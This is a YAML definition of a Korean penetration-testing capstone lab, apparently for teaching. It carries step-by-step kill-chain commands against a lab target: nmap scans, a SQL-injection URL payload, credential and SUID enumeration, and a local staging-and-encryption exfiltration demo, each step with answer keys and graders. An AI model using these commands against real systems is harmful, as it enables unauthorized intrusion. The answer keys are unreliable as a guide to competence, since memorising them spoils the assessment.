lab_id: standalone-attack-adv-week14
title: "종합 모의 침투 — 정찰부터 유출까지 전 킬체인 (캡스톤)"
version: standalone-attack-adv
course: attack-adv
week: 14
description: |
  공격 고급 W14 — 종합 캡스톤. W01~W13 전 공격 역량을 하나의 모의 침투(penetration test)로 통합한다.
  스코핑→정찰→침투→발판/C2→권한상승→측면이동→유출→정리의 전 킬체인을 el34에서 수행한다. el34-attacker
  에서 인가 표적(el34-web/내부망)에. ⚠️ 인가된 실습만(이 캡스톤은 통합 시험). 외부 시스템 금지. self-clean.
difficulty: hard
duration_minutes: 210
prerequisites:
  - "attack-adv W01~W13 전 주차 통과(이 캡스톤은 통합 시험)"
  - "el34 호스트 SSH + docker exec, el34-attacker(모의침투 박스)"
  - "lecture §2(킬체인 통합) §3(스코핑/방법론) §4(보고) 숙지"
objectives:
  - "정찰→침투→발판→상승→이동→유출의 전 킬체인 수행"
  - "각 단계의 도구·기법을 상황에 맞게 선택·연결"
  - "모의 침투 방법론(스코핑·증거·보고)과 방어 권고 도출"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 1단계 스코핑·정찰
      ## 📖 개념 한 줄
      모의 침투의 시작 = 인가 범위 확인 + 표적 정찰(W01/W02).
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "command -v nmap sqlmap nc >/dev/null && echo toolkit_ok; nmap -sS -T3 --top-ports 50 10.20.30.1 2>/dev/null | grep -c open"; echo recon_phase_done
      ```
      ## ✅ 합격 기준
      스코핑·정찰이 수행되면(recon_phase_done) 통과.
    hint: '스코핑/정찰'
    category: survey
    points: 12
    answer: |
      echo "=== 1단계 스코핑·정찰 ==="
      docker exec el34-attacker sh -c "command -v nmap sqlmap nc >/dev/null && echo toolkit_ok; echo '인가 범위: el34-web(10.20.30.1)·내부망'; nmap -sS -T3 --top-ports 50 10.20.30.1 2>/dev/null | grep -c open"; echo recon_phase_done
      echo "→ 스코핑(인가 범위)+정찰(열린 포트). 모의 침투는 RoE(교전 규칙) 안에서만(W01/W02)"
    answer_detail: "스코핑·정찰 = 인가 범위(RoE) 확인+표적 정찰. 모의 침투의 합법성 기반. 킬체인 1단계."
    verify:
      type: output_contains
      expect: 'recon_phase_done'
      field: stdout
      semantic: {intent: "스코핑/정찰", success_criteria: ["범위/정찰"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 2단계 침투 (Exploitation)
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'exploit=%{http_code}' -A 'aa14cap-student' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit'"; echo; echo exploit_phase_done
      ```
      ## ✅ 합격 기준
      침투(익스플로잇)가 수행되면(exploit_phase_done) 통과.
    hint: '침투'
    category: manipulation
    points: 12
    answer: |
      echo "=== 2단계 침투(Exploitation) ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'exploit=%{http_code}' -A 'aa14cap-student' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit'"; echo; echo exploit_phase_done
      echo "→ 정찰로 찾은 SQLi 익스플로잇(태그 aa14cap). 정찰→침투 연결(W04). 403이면 WAF 우회(W03) 필요"
    answer_detail: "침투 = 정찰 결과 기반 익스플로잇(SQLi+태그). 정찰→침투 연결. WAF 시 우회(W03). 킬체인 2단계."
    verify:
      type: output_contains
      expect: 'exploit_phase_done'
      field: stdout
      semantic: {intent: "침투", success_criteria: ["익스플로잇"], acceptable_methods: ["**[OSS] SQLi (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 3단계 발판·C2
      ## 💻 실행 명령 (자체완결 C2 데모)
      ```bash
      docker exec el34-attacker sh -c "(timeout 2 python3 -m http.server 55014 >/dev/null 2>&1 &) ; sleep 0.4; curl -s -o /dev/null -w 'c2=%{http_code}' http://127.0.0.1:55014/; echo"; echo foothold_phase_done
      ```
      ## ✅ 합격 기준
      발판·C2가 수립되면(foothold_phase_done) 통과.
    hint: '발판/C2'
    category: analysis
    points: 12
    answer: |
      echo "=== 3단계 발판·C2 ==="
      docker exec el34-attacker sh -c "(timeout 2 python3 -m http.server 55014 >/dev/null 2>&1 &) ; sleep 0.4; curl -s -o /dev/null -w 'c2=%{http_code}' http://127.0.0.1:55014/; echo"; echo foothold_phase_done
      echo "→ 침투 후 C2 채널 수립(W07). 리버스 셸→비콘→지속성. 침투를 '지속 통제'로 전환"
    answer_detail: "발판·C2 = 침투 후 지속 통제 채널 수립(W07). 리버스셸→C2→지속성. 킬체인 3단계."
    verify:
      type: output_contains
      expect: 'foothold_phase_done'
      field: stdout
      semantic: {intent: "발판/C2", success_criteria: ["C2"], acceptable_methods: ["**[OSS] C2 (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 4단계 권한 상승·자격 수집
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "id; echo 'SUID:'; find / -perm -4000 -type f 2>/dev/null | wc -l; echo 'creds:'; ls ~/.ssh 2>/dev/null | wc -l"; echo privesc_phase_done
      ```
      ## ✅ 합격 기준
      권한 상승 열거·자격 수집이 수행되면(privesc_phase_done) 통과.
    hint: '권한상승'
    category: analysis
    points: 14
    answer: |
      echo "=== 4단계 권한 상승·자격 수집 ==="
      docker exec el34-attacker sh -c "id; echo 'SUID 후보:'; find / -perm -4000 -type f 2>/dev/null | wc -l; echo 'SSH 키:'; ls ~/.ssh 2>/dev/null | wc -l"; echo privesc_phase_done
      echo "→ SUID·sudo 열거로 root 경로 탐색(W06)+자격 수집(측면 이동 연료). 발판→완전 장악"
    answer_detail: "권한 상승·자격 수집 = SUID/sudo 열거(W06)+자격 수집. root 획득+측면 이동 연료. 킬체인 4단계."
    verify:
      type: output_contains
      expect: 'privesc_phase_done'
      field: stdout
      semantic: {intent: "권한상승", success_criteria: ["SUID/자격"], acceptable_methods: ["**[OSS] find (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 5단계 측면 이동
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "nmap -sn 10.20.30.0/24 2>/dev/null | grep -ic 'scan report'"; echo lateral_phase_done
      ```
      ## ✅ 합격 기준
      측면 이동(내부 정찰)이 수행되면(lateral_phase_done) 통과.
    hint: '측면 이동'
    category: analysis
    points: 14
    answer: |
      echo "=== 5단계 측면 이동 ==="
      docker exec el34-attacker sh -c "echo '내부 호스트 수:'; nmap -sn 10.20.30.0/24 2>/dev/null | grep -ic 'scan report'"; echo lateral_phase_done
      echo "→ 발판에서 내부 정찰(W08)→수집 자격 재사용→다음 호스트. 한 발판을 네트워크로 확장"
    answer_detail: "측면 이동 = 내부 정찰+자격 재사용(W08)으로 네트워크 확산. 발판→네트워크 전체. 킬체인 5단계."
    verify:
      type: output_contains
      expect: 'lateral_phase_done'
      field: stdout
      semantic: {intent: "측면 이동", success_criteria: ["내부 확산"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 6단계 유출·정리
      ## 💻 실행 명령 (자체완결 데모·self-clean)
      ```bash
      docker exec el34-attacker sh -c "mkdir -p /tmp/cap14; cp /etc/hostname /tmp/cap14/ 2>/dev/null; tar czf /tmp/cap14/loot.tgz -C /tmp/cap14 hostname 2>/dev/null; openssl enc -aes-256-cbc -pbkdf2 -in /tmp/cap14/loot.tgz -out /tmp/cap14/loot.enc -k cap14 2>/dev/null && echo staged_encrypted; rm -rf /tmp/cap14 && echo cleaned"; echo exfil_phase_done
      ```
      ## ✅ 합격 기준
      유출·정리가 수행되면(exfil_phase_done) 통과.
    hint: '유출/정리'
    category: analysis
    points: 12
    answer: |
      echo "=== 6단계 유출·정리 ==="
      docker exec el34-attacker sh -c "mkdir -p /tmp/cap14; cp /etc/hostname /tmp/cap14/ 2>/dev/null; tar czf /tmp/cap14/loot.tgz -C /tmp/cap14 hostname 2>/dev/null; openssl enc -aes-256-cbc -pbkdf2 -in /tmp/cap14/loot.tgz -out /tmp/cap14/loot.enc -k cap14 2>/dev/null && echo staged_encrypted; rm -rf /tmp/cap14 && echo cleaned"; echo exfil_phase_done
      echo "→ 데이터 스테이징→암호화→반출(W10)+흔적 정리(W11). 목적 달성+OPSEC. self-clean 완료"
    answer_detail: "유출·정리 = 스테이징/암호화/반출(W10)+흔적 정리(W11). 공격 목적 달성+OPSEC. 킬체인 최종."
    verify:
      type: output_contains
      expect: 'exfil_phase_done'
      field: stdout
      semantic: {intent: "유출/정리", success_criteria: ["유출/정리"], acceptable_methods: ["**[OSS] 유출 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 킬체인 통합·방어 권고 — 단계별 실재현 집계
      ## 💻 실행 명령 (각 킬체인 단계를 실제 재현해 도달 단계 집계)
      ```bash
      docker exec el34-attacker sh -c 'S=0; nmap -sS -T4 --top-ports 20 10.20.30.1 2>/dev/null | grep -q open && { echo "정찰(T1046) OK"; S=$((S+1)); }; curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1" && { echo "침투 경로(T1190) OK"; S=$((S+1)); }; nc -z -w2 10.20.30.201 22 2>/dev/null && { echo "측면이동 경로(T1021) OK"; S=$((S+1)); }; echo "재현된 킬체인 단계: $S"; [ "$S" -ge 2 ] && echo integration_done'
      ```
      ## ✅ 합격 기준
      킬체인 단계(정찰/침투/이동)를 **실제 재현**해 2단계 이상 도달하면(integration_done) 통과.
      ## 🔧 도구 풀이
      - ATT&CK 매핑: 정찰 T1046·침투 T1190·C2 T1071·상승 T1068·이동 T1021·유출 T1041. 한 단계만 끊어도 전체 차단(방어 거울).
    hint: '통합/방어권고'
    category: report
    points: 12
    answer: |
      echo "=== 킬체인 통합·방어 권고 — 단계별 실재현 집계 ==="
      docker exec el34-attacker sh -c 'S=0; nmap -sS -T4 --top-ports 20 10.20.30.1 2>/dev/null | grep -q open && { echo "정찰(T1046) OK"; S=$((S+1)); }; curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1" && { echo "침투 경로(T1190) OK"; S=$((S+1)); }; nc -z -w2 10.20.30.201 22 2>/dev/null && { echo "측면이동 경로(T1021) OK"; S=$((S+1)); }; echo "재현된 킬체인 단계: $S"; [ "$S" -ge 2 ] && echo integration_done'
      echo "→ 정찰/침투/이동 단계를 실제 재현·집계. ATT&CK 매핑. 방어 권고: IDS/WAF/아웃바운드통제/최소권한/망분리. 한 단계만 끊어도 전체 차단"
    answer_detail: "킬체인 통합 = 단계별 실재현 집계(S≥2 게이트)+ATT&CK/방어권고. 가짜 echo 아닌 실재현. 공격의 거울=방어."
    verify:
      type: output_contains
      expect: 'integration_done'
      field: stdout
      semantic: {intent: "통합/방어권고", success_criteria: ["ATT&CK/방어"], acceptable_methods: ["**[관리적] 통합 (권장)**"]}
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 모의 침투 보고서 (캡스톤)
      ## 💻 보고서 양식
      ```markdown
      # 공격고급 W14 종합 모의 침투 보고서 (학번, 이름)
      ## 1. 요약·스코핑·전 킬체인 경로
      ## 2. 단계별 발견(증거·심각도)
      ## 3. 방어 권고(단계별)·결론
      ```
      ## ✅ 합격 기준
      전 킬체인 + 증거 + 방어 권고 모두 포함.
    hint: '킬체인+증거+방어'
    category: report
    points: 12
    answer: |
      echo "=== 종합 모의 침투 보고서(캡스톤) — 실재현 증거 기반 ==="
      docker exec el34-attacker sh -c 'P=$(nmap -sS -T4 --top-ports 20 10.20.30.1 2>/dev/null | grep -c open); echo "# 공격고급 W14 종합 모의 침투 보고서(캡스톤)"; echo "## 1. 요약: 인가 범위에서 정찰→침투→발판→상승→이동→유출 전 킬체인 재현(정찰 열린포트 ${P}개 실측)"; echo "## 2. 단계: 정찰(T1046)·침투(T1190 SQLi)·발판/C2(T1071)·상승(T1068)·이동(T1021)·유출(T1041)"; echo "## 3. 방어 권고: IDS(정찰)·입력검증/WAF(침투)·아웃바운드 통제(C2/유출)·최소권한(상승)·망분리/MFA(이동)"; echo "## 결론: 공격은 사슬 — 한 단계만 끊어도 전체 차단. 공격을 알아야 방어(soc-adv W15)를 설계"; echo pentest_capstone_report_done'
      echo "→ 보고서가 실재현 정찰 결과를 증거로 인용. 정적 템플릿 아닌 실측 기반"
    answer_detail: "캡스톤 보고 = 실재현 정찰 결과 인용+전 킬체인/방어권고. 증거 기반. W01~W13 통합. 공격의 거울=방어."
    verify:
      type: output_contains
      expect: 'pentest_capstone_report_done'
      field: stdout
      semantic: {intent: "캡스톤 보고", success_criteria: ["킬체인/증거/방어"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
    target_vm: web
